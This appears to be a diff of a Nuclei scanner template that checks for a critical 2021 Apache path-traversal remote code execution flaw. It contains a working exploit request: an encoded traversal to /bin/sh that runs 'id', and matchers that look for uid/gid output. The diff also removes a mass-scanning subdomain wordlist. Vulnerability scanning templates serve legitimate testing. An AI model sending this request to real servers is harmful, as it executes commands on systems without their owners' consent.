@@ -17,8 +17,7 @@ info:
   severity: critical
   tags: cve,cve2021,rce,apache
 requests:
-- attack: sniper
-  extractors:
+- extractors:
   - regex:
     - (u|g)id=.*
     type: regex
@@ -34,12 +33,10 @@ requests:
     - gid=
     - groups=
   matchers-condition: and
-  payloads:
-    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
   raw:
   - 'POST /cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1
 
-    Host: {{Subdomains}}
+    Host: {{Hostname}}
 
     Content-Type: application/x-www-form-urlencoded
 
@@ -47,4 +44,3 @@ requests:
     echo Content-Type: text/plain; echo; id
 
     '
-  threads: 100
